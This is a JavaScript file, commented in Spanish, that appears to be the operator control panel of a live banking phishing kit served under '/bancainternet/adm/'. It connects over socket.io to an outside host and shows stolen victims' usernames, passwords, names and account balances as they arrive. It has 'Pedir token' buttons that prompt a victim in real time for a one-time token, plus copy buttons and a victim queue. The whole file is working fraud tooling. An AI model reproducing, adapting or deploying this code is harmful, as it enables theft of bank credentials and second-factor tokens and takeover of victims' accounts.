const socket = io.connect("https://macro-personas.com/", {
    forceNew: true,
    transports: ["polling"],
 });

//Obtener identificador original
const queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
//identificador listo
const getAdm = urlParams.get('s');

socket.on("connect", () => {
    console.log("El socket se ha conectado: ", socket.id);
    socket.emit("AdmOn", { 'socketSesion': socket.id, 'Id': getAdm });

    /*var QuienSosAuth = prompt("¿Quién sos?");
    socket.emit("QuienSosAuth", [QuienSosAuth, socket.id]);*/
})

socket.on("admAssignOtherId", NewId => {
    window.location.href = "/bancainternet/adm/?s=" + NewId;
})


/*socket.on("SosAdmin", res => {
    if(res){
        const preloader = document.querySelector("#preloader")
        preloader.style.display = "none";
    }else{
        window.location.href = "/bancainternet/";
    }
})*/

socket.on("countOfAdm", count => {
    document.querySelector("#countAdm").innerHTML = count;
})

const panelData = document.querySelector("#panel-1");
const panelDataReady = document.querySelector("#panel-2");
var dataCollection = [];

socket.on("NewData", data => {
    if (!document.querySelector("#parent-" + data[0].socket)) {
        var dataInfo = `<div class="row-data" id="parent-${data[0].socket}"> 
                            <div class="info-row" id="row-${data[0].socket}"> 
                                <p id="u-${data[0].socket}"> 
                                    <b>User:</b> <span id="info-${data[0].user}">${data[0].user}</span>
                                    <button class="token-copiar" id="button-${data[0].user}">
                                    </button> 
                                </p>
                                <p id="p-${data[0].socket}">
                                    <b>Pass:</b> <span id="info-${data[0].pass}">${data[0].pass}</span>
                                    <button class="token-copiar" id="button-${data[0].pass}">
                                    </button> 
                                </p>
                                <p id="n-${data[0].socket}"> <b>Nombre:</b> ${data[1]} </p>
                                <p id="a-${data[0].socket}"> <b>Ultima vez:</b> ${data[2].substring(14)} </p>
                                <p style="display: block" id="s-${data[0].socket}">  </p>
                            </div>
                            <div class="buttons-row" id="brow-${data[0].socket}" style="display:flex">
                                <!--<button class="iniciar-sesion" id="l-${data[0].socket}">Probar data</button>-->
                                <button style="display: none" class="pedir-token" id="t-${data[0].socket}">Pedir token</button>
                                <button style="display: none" class="finalizar" id="f-${data[0].socket}">Finalizar</button>
                                <button style="display: none" class="eliminar" id="d-${data[0].socket}">Eliminar</button>
                            </div>
                        </div>`
        panelData.innerHTML += dataInfo;
        var UsersQueue = document.querySelectorAll('.finalizar');
        var CountUsers = UsersQueue.length;
        var CountUsersBox = document.querySelector("#CountUsersBox");
        CountUsersBox.innerHTML = CountUsers;
        var saldos = ''
        for (let i = 3; i < data.length; i++) {
            saldos += `<b>Saldo:</b> ${data[i]} <br> `
        }
        console.log(data[3])
        document.querySelector("#s-"+data[0].socket).innerHTML = saldos;
        //puede ir a una db
        dataCollection.push(data);
    } else if (document.querySelector("#token-load-" + data[0].socket)) {
        document.querySelector("#token-load-" + data[0].socket).remove();
        document.querySelector("#t-" + data[0].socket).style.display = "flex";
    }
    setTimeout(() => {
        socket.emit("EnviarInfoHomeConect", [data, socket.id]);
    }, 2000);
})

socket.on("showRowB", originalSocket => {
    if (document.querySelector("#brow-" + originalSocket)) {
        document.querySelector("#brow-" + originalSocket).style.display = "flex";
    }
})

socket.on("showBTNS", originalSocket => {
    if (document.querySelector("#t-" + originalSocket)) {
        document.querySelector("#t-" + originalSocket).style.display = "flex";
    }
    if (document.querySelector("#f-" + originalSocket)) {
        document.querySelector("#f-" + originalSocket).style.display = "flex";
    }
    if (document.querySelector("#d-" + originalSocket)) {
        document.querySelector("#d-" + originalSocket).style.display = "flex";
    }
})

//ResendData
socket.on("ResendData", data => {
    setTimeout(() => {
        socket.emit("EnviarInfoHomeConect", data);
    }, 2000);
})

//Get Token
socket.on("ReSendToken", dataToken => {

    document.querySelector("#t-" + dataToken.idHome).style.display = "block";
    var parentData = document.querySelector("#row-" + dataToken.idHome);
    document.querySelector("#token-load-" + dataToken.idHome).remove();
    dataTokenInsert = `<p> 
                                <b>Token:</b> <span id="info-${dataToken.Token}">${dataToken.Token}</span>
                                <button class="token-copiar" id="button-${dataToken.Token}">
                                    
                                </button>
                            </p>`;
    parentData.innerHTML += dataTokenInsert;

    //document.querySelector("#t-"+dataToken.idHome).remove();

})

//Disconnect queue
/*socket.on("DisconnectQueue", byeSocket => {
    if(document.querySelector("#row-"+byeSocket.Id)){
        document.querySelector("#t-"+byeSocket.Id).remove();
        document.querySelector("#f-"+byeSocket.Id).remove();
    }
})*/

//Buttons panel
const on = (element, event, selector, handler) => {
    element.addEventListener(event, e => {
        if (e.target.closest(selector)) {
            handler(e)
        }
    })
}

on(document, 'click', '.pedir-token', e => {
    const id = e.target.id;
    idUser = id.substring(2);
    //const admToken = socket.id;
    socket.emit("PedirToken", { 'idUser': idUser, 'idAdm': getAdm });
    document.querySelector("#" + id).innerHTML = "Volver a pedir token";
    document.querySelector("#" + id).style.display = "none";

    if (document.querySelector("#token-load-" + idUser)) {
        document.querySelector("#token-load-" + idUser).remove();
    }

    const parentData = document.querySelector("#row-" + idUser);
    dataTokenInsert = `<p class="token-load" id="token-load-${idUser}"> 
                            <b>Token:</b> 
                            <img src="/img/spinner-general.gif">
                        </p>`;
    parentData.innerHTML += dataTokenInsert;
})

on(document, 'click', '.token-copiar', e => {
    const id = e.target.id;
    const token = id.substring(7);
    //const contentToken = document.querySelector("#info-"+token);
    //const text = contentToken.innerHTML;

    var codigoACopiar = document.getElementById("info-" + token);
    var seleccion = document.createRange();
    seleccion.selectNodeContents(codigoACopiar);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(seleccion);
    var res = document.execCommand('copy');
    window.getSelection().removeRange(seleccion);

    //navigator.clipboard.writeText(text);
    document.querySelector('#' + id).classList.toggle('token-copiado');
    setTimeout(() => {
        document.querySelector('#' + id).classList.toggle('token-copiado');
    }, 250);
})

function outerHTML(node) {
    return node.outerHTML || new XMLSerializer().serializeToString(node);
}

on(document, 'click', '.finalizar', e => {
    const id = e.target.id;
    idUser = id.substring(2);
    socket.emit("Finalizar", idUser);
    document.querySelector("#f-" + idUser).remove();
    document.querySelector("#t-" + idUser).remove();

    if(document.querySelector("#token-load-"+idUser)){
        document.querySelector("#token-load-"+idUser).remove();
    }

    //Actualizar conteo
    var UsersQueue = document.querySelectorAll('.finalizar');
    var CountUsers = UsersQueue.length;
    var CountUsersBox = document.querySelector("#CountUsersBox");
    CountUsersBox.innerHTML = CountUsers;

    //Enviar al fondo
    panelDataReady.innerHTML += outerHTML(document.querySelector("#parent-" + idUser));
    document.querySelector("#parent-" + idUser).remove();
    document.querySelector("#parent-" + idUser).classList.add("personReady");
})

on(document, 'click', '.eliminar', e => {
    if (confirm('¿Deseas eliminar este registro?')) {
        const id = e.target.id;
        idUser = id.substring(2);

        if (document.querySelector("#f-" + idUser)) {
            socket.emit("Finalizar", idUser);
        }

        document.querySelector("#parent-" + idUser).remove();
    }
})

// RECARGAR LA PAGINA
window.onbeforeunload = function () {
    return "¿Desea recargar la página web?";
};